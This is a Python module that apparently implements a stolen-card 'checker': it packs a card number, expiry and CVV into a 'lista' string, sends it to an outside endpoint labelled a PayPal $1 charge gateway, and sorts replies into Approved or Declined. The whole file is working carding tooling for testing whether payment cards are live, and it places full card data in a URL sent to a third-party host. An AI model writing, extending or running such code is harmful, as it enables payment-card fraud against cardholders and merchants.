"""
PayPal $1 Gateway (Alternative)
API Endpoint: https://web-e3c8.onrender.com/pp.php/
"""
import aiohttp
import asyncio
import json

async def paypal1_check(cc: str, mm: str, yy: str, cvv: str) -> dict:
    """
    PayPal $1 charge gateway (alternative endpoint)
    
    Args:
        cc: Card number
        mm: Expiry month
        yy: Expiry year
        cvv: CVV code
    
    Returns:
        dict: {'status': str, 'response': str}
    """
    # Format card
    full_card = f"{cc}|{mm}|{yy}|{cvv}"
    
    # API endpoint
    api_url = f"https://web-e3c8.onrender.com/pp.php/?lista={full_card}"
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                api_url,
                headers={"User-Agent": "Mozilla/5.0"},
                timeout=aiohttp.ClientTimeout(total=90)
            ) as resp:
                api_response = await resp.text()
                
                # Parse JSON response
                try:
                    data = json.loads(api_response)
                except json.JSONDecodeError:
                    # Parse as text
                    if "charged" in api_response.lower() or "success" in api_response.lower():
                        return {
                            'status': 'Approved',
                            'response': api_response[:200]
                        }
                    elif "declined" in api_response.lower():
                        return {
                            'status': 'Declined',
                            'response': api_response[:200]
                        }
                    else:
                        return {
                            'status': 'Unknown',
                            'response': api_response[:200]
                        }
                
                # Extract data
                status = data.get("status", "Unknown")
                response = data.get("response", "No response")
                message = data.get("message", response)
                details = data.get("details", "")
                
                # Clean response
                cleaned_response = details or message or response
                if isinstance(cleaned_response, str) and ":" in cleaned_response:
                    cleaned_response = cleaned_response.split(":", 1)[1].strip()
                
                # Determine status
                if isinstance(status, str):
                    if "charged" in status.lower() or "🔥" in status:
                        final_status = "Approved"
                    elif "declined" in status.lower():
                        final_status = "Declined"
                    elif "error" in status.lower():
                        final_status = "Unknown"
                    else:
                        final_status = status
                else:
                    final_status = "Unknown"
                
                return {
                    'status': final_status,
                    'response': cleaned_response
                }
                
    except asyncio.TimeoutError:
        return {
            'status': 'Unknown',
            'response': 'API request timed out'
        }
    except Exception as e:
        return {
            'status': 'Unknown',
            'response': f'Error: {str(e)}'
        }
